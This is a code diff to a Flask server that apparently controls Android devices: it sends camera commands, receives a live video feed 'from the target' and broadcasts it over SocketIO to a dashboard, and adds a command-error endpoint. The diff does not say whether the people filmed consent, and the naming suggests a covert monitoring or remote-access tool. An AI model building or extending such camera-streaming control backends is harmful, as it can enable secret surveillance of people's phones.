@@ -681,48 +681,34 @@ def send_camera_command(device_id):
 
 @routes.route('/api/audit/livestream/feed', methods=['POST'])
 def receive_livestream_feed():
-    """Endpoint that receives the continuous video chunks from the target"""
+    """Endpoint that receives the continuous video chunks from the target and broadcasts them via SocketIO"""
     device_id = request.form.get('device_id', 'unknown')
+    is_first_chunk = request.form.get('is_first_chunk') == 'true'
     
     if 'chunk' in request.files:
+        import base64
+        from app import socketio
+        from app.streaming import video_init_segments
+        from .device_utils import resolve_to_device_id
+        
         chunk_file = request.files['chunk']
+        chunk_data = chunk_file.read()
         
-        # Ensure directory exists
-        stream_dir = os.path.join(current_app.root_path, 'streams', device_id)
-        os.makedirs(stream_dir, exist_ok=True)
+        # Base64 encode the binary chunk for safe websocket transport
+        chunk_b64 = base64.b64encode(chunk_data).decode('utf-8')
         
-        stream_path = os.path.join(stream_dir, 'live_feed.webm')
+        actual_device_id = resolve_to_device_id(device_id)
         
-        # Append the binary chunk directly to the growing webm file
-        with open(stream_path, 'ab') as f:
-            f.write(chunk_file.read())
+        if is_first_chunk:
+            # Cache the Initialization Segment (WebM Header)
+            video_init_segments[actual_device_id] = chunk_b64
             
-        return jsonify({"status": "Chunk appended"}), 200
+        # Broadcast to all listeners in the specific device's video room
+        socketio.emit('video_chunk', {'chunk': chunk_b64}, room=f'video_listeners_{actual_device_id}', namespace='/stream')
+            
+        return jsonify({"status": "Chunk broadcasted"}), 200
         
     return jsonify({"error": "No chunk data"}), 400
-
-
-@routes.route('/api/audit/livestream/watch/<device_id>', methods=['GET'])
-def watch_livestream(device_id):
-    """Serve the continuous video feed to the dashboard"""
-    stream_dir = os.path.join(current_app.root_path, 'streams', device_id)
-    stream_path = os.path.join(stream_dir, 'live_feed.webm')
-    
-    if not os.path.exists(stream_path):
-        return "Stream not started", 404
-        
-    def generate():
-        with open(stream_path, 'rb') as f:
-            while True:
-                data = f.read(4096)
-                if data:
-                    yield data
-                else:
-                    # Wait for more data if EOF is reached
-                    import time
-                    time.sleep(0.5)
-                    
-    return current_app.response_class(generate(), mimetype='video/webm')
 
 
 @routes.route('/api/command/<int:command_id>/complete', methods=['POST'])
@@ -772,7 +758,36 @@ def complete_device_command(command_id):
         db.session.rollback()
         return jsonify({'success': False, 'error': str(e)}), 500
 
-
+@routes.route('/api/command/<int:command_id>/error', methods=['POST'])
+def command_error(command_id):
+    """Report an error for a specific command from the device"""
+    try:
+        data = request.get_json() or {}
+        device_id = data.get('device_id')
+        error_msg = data.get('error', 'Unknown error')
+        
+        current_app.logger.error(f"❌ Command Error Reported - ID: {command_id}, Device: {device_id}, Error: {error_msg}")
+        
+        command_record = DeviceCommand.query.get(command_id)
+        if not command_record:
+            return jsonify({'success': False, 'error': 'Command not found'}), 404
+            
+        if device_id:
+            from .device_utils import resolve_to_device_id
+            actual_device_id = resolve_to_device_id(device_id)
+            if command_record.device_id != actual_device_id:
+                return jsonify({'success': False, 'error': 'Device ID mismatch'}), 403
+                
+        command_record.status = 'failed'
+        # Storing error message in response_data if available, or just log it
+        db.session.commit()
+        
+        return jsonify({'success': True}), 200
+        
+    except Exception as e:
+        current_app.logger.error(f"❌ Error updating command error {command_id}: {e}")
+        db.session.rollback()
+        return jsonify({'success': False, 'error': str(e)}), 500
 @routes.route('/api/command', methods=['GET'])
 def get_device_command():
     """Get pending command for device (used by Android app polling with query parameter)"""
